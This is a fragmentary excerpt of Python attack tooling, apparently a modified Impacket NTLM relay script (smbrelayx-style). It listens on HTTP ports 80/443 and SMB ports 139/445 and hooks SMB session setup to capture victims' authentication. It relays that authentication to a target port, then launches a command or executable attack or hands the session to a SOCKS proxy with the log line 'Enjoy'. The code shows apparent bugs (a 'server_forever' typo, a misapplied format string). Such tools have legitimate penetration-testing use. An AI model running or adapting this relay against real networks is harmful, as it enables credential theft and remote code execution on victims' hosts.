...
class SMBClient(SMB):
    def __init__(self, remote_name, extended_security = True, sess_port = TP):
...
class HTTPRelayServer(Thread):
                    ...
                    if self.target not in ATTACKED_HOSTS:
                        ...
                        if self.server.runSocks is True:
                            ...
                            activeConnections.put(
                                (self.target, TP, authenticateMessage['user_name'], self.client, {'CHALLENGE_MESSAGE': self.challengeMessage}))
                            logging.info("Adding %s(%i) to active SOCKS connection. Enjoy" % self.target,TP)
                        else:
                            clientThread = doAttack(self.client,self.server.exeFile,self.server.command)
                            self.client = None
                            clientThread.start()
                    else:
                        logging.error('%s is being attacked at the moment, skipping.. ' % self.target)
    ...
    def run(self):
        logging.info("Setting up HTTP Servers on ports 80 and 443")
        httpd80 = self.HTTPServer(("", 80), self.HTTPHandler, self.target, self.exeFile, self.command, self.mode,
                                self.outputFile, self.one_shot, runSocks = self.runSocks)
        httpd443 = self.HTTPServer(("", 443), self.HTTPHandler, self.target, self.exeFile, self.command, self.mode,
                                self.outputFile, self.one_shot, runSocks = self.runSocks)
        httpd80.serve_forever()
        httpd443.server_forever()
...
class SMBRelayServer(Thread):
    def __init__(self, outputFile = None):
        ...
        self.server139 = SMBSERVER(('0.0.0.0',139), config_parser = smbConfig)
        self.server445 = SMBSERVER(('0.0.0.0',445), config_parser = smbConfig)
        self.server139.processConfigFile()
        self.server445.processConfigFile()

        self.origSmbComNegotiate = self.server139.hookSmbCommand(SMB.SMB_COM_NEGOTIATE, self.SmbComNegotiate)
        self.origSmbComNegotiate = self.server445.hookSmbCommand(SMB.SMB_COM_NEGOTIATE, self.SmbComNegotiate)
        self.origSmbSessionSetupAndX = self.server139.hookSmbCommand(SMB.SMB_COM_SESSION_SETUP_ANDX,
                                                                  self.SmbSessionSetupAndX)
        self.origSmbSessionSetupAndX = self.server445.hookSmbCommand(SMB.SMB_COM_SESSION_SETUP_ANDX,
                                                                  self.SmbSessionSetupAndX)                                                          
        # Let's use the SMBServer Connection dictionary to keep track of our client connections as well
        self.server139.addConnection('SMBRelay', '0.0.0.0', 445)
        self.server445.addConnection('SMBRelay', '0.0.0.0', 139)
    ...
    def SmbSessionSetupAndX(self, connId, smbServer, smbCommand, recvPacket):
        ...
        if connData['_dialects_parameters']['Capabilities'] & SMB.CAP_EXTENDED_SECURITY:
            ...
            if messageType == 0x01:
                ...
                if errorCode != STATUS_SUCCESS:
                    ...
                    if self.runSocks is True:
                        # Pass all the data to the socksplugins proxy
                        activeConnections.put((self.target, TP, authenticateMessage['user_name'], smbClient, connData))
                        logging.info("Adding %s(%i) to active SOCKS connection. Enjoy" % self.target,TP)
                        del (smbData[self.target])
                    else:
                        del (smbData[self.target])
            ...
            if errorCode != STATUS_SUCCESS:
                ...
                if self.runSocks is True:
                    # Pass all the data to the socksplugins proxy
                    activeConnections.put((self.target, TP, smbClient, connData))
                    logging.info("Adding %s(%i) to active SOCKS connection. Enjoy" % self.target,TP)
    ...
    def _start(self):
        self.server139.serve_forever()
        self.server445.serve_forever()

    def run(self):
        logging.info("Setting up SMB Servers on ports 139 and 445")
        self._start()
...
if __name__ == '__main__':
    ...
    parser.add_argument('-tp', action='store', required=False, metavar='TARGET_PORT', default = 445,type=int, help='Set the port to relay to on the target (either 139 or 445, default is 445) ')
